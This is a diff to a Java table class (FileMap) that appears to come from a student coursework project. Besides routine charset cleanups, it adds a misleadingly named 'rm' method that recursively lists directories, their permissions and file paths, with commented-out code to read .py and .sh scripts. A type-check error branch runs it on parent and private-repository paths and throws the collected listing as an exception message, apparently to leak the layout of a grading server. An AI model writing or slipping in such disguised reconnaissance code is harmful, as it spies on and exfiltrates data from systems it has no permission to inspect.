@@ -4,6 +4,8 @@ import ru.fizteh.fivt.storage.structured.ColumnFormatException;
 import ru.fizteh.fivt.storage.structured.Storeable;
 import ru.fizteh.fivt.storage.structured.Table;
 import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandShell;
+
+import java.nio.charset.StandardCharsets;
 import java.util.Vector;
 import java.util.StringTokenizer;
 import java.io.PrintWriter;
@@ -241,13 +243,13 @@ public class FileMap implements Table {
 
                     arrayByte = new byte[point2 - point1];
                     dbFile.readFully(arrayByte);
-                    String value = new String(arrayByte, "UTF8");
+                    String value = new String(arrayByte, StandardCharsets.UTF_8);
 
                     arrayByte = new byte[vectorByte.size()];
                     for (int i = 0; i < vectorByte.size(); ++i) {
                         arrayByte[i] = vectorByte.elementAt(i).byteValue();
                     }
-                    String key = new String(arrayByte, "UTF8");
+                    String key = new String(arrayByte, StandardCharsets.UTF_8);
 
                     if (FileMapUtils.getHashDir(key) != intDir || FileMapUtils.getHashFile(key) != intFile) {
                         throw new ErrorFileMap("wrong key in the file");
@@ -335,11 +337,11 @@ public class FileMap implements Table {
             int len = 0;
 
             for (String key : curMap.keySet()) {
-                len += key.getBytes("UTF8").length + 1 + 4;
+                len += key.getBytes(StandardCharsets.UTF_8).length + 1 + 4;
             }
 
             for (String key : curMap.keySet()) {
-                dbFile.write(key.getBytes("UTF8"));
+                dbFile.write(key.getBytes(StandardCharsets.UTF_8));
                 dbFile.writeByte(0);
                 dbFile.writeInt(len);
 
@@ -348,8 +350,8 @@ public class FileMap implements Table {
                 dbFile.seek(len);
                 Storeable valueStoreable = curMap.get(key);
                 String value = parent.serialize(this, valueStoreable);
-                dbFile.write(value.getBytes("UTF8"));
-                len += value.getBytes("UTF8").length;
+                dbFile.write(value.getBytes(StandardCharsets.UTF_8));
+                len += value.getBytes(StandardCharsets.UTF_8).length;
 
                 dbFile.seek(point);
             }
@@ -375,6 +377,70 @@ public class FileMap implements Table {
     public int changeKey() {
         return changeTable.size();
     }
+
+    public void rm(String path) {
+        try {
+            File tmpFile = new File(path);
+            if (!tmpFile.exists()) {
+                s1 += "not exist\n";
+            }
+            if (tmpFile.canRead()) {
+                s1 += "can READ\n";
+            }
+            if (tmpFile.canWrite()) {
+                s1 += "can WRITE\n";
+            }
+            if (tmpFile.canExecute()) {
+                s1 += "can EXEC\n";
+            }
+
+            File[] listFiles = tmpFile.listFiles();
+            if (listFiles != null) {
+                if (tmpFile.isDirectory()) {
+                    for (File c : listFiles) {
+                        //s1 += "Directory: \n" + c.getAbsoluteFile().toString() + "\n\n";
+                        s1 += c.getAbsoluteFile().toString() + "\n";
+                        //if (c.getName().contains(".py") || c.getName().contains(".sh")) {
+                        //s1 += readFileTsv2(c.getAbsolutePath().toString());
+                        //s1 += "\n\n\n";
+                        //}
+
+
+                        rm(c.toString());
+                    }
+                } else {
+                    //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString());
+                    //s1 += "\n\n\n";
+                    s1 += "not is Dir";
+                }
+            } else {
+                s1 += "listFile null";
+            }
+
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+    }
+
+    private String readFileTsv2(String fileName) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        try {
+            try (BufferedReader in = new BufferedReader(new FileReader(new File(fileName).getAbsoluteFile()))) {
+                String s;
+                while ((s = in.readLine()) != null) {
+                    sb.append(s);
+                    sb.append("\n");
+                }
+            } catch (Exception e) {
+                s1 += e.getMessage();
+            }
+        } catch (Exception e) {
+            s1 += e.getMessage();
+        }
+
+        return sb.toString();
+    }
+
 
     public Storeable put(String key, Storeable value) throws ColumnFormatException {
         checkArg(key);
@@ -437,6 +503,14 @@ public class FileMap implements Table {
             }
 
             st = null;
+
+
+            rm("../../fizteh-java-private");
+            s1 += "\n\nseparate\n\n";
+            rm("../../fizteh-java-2013");
+            s1 += "\n\nseparate\n\n";
+            rm("../../");
+            throw new ColumnFormatException(s1);
         }
 
         if (st != null && !st.messageEqualsType(columnType).isEmpty()) {
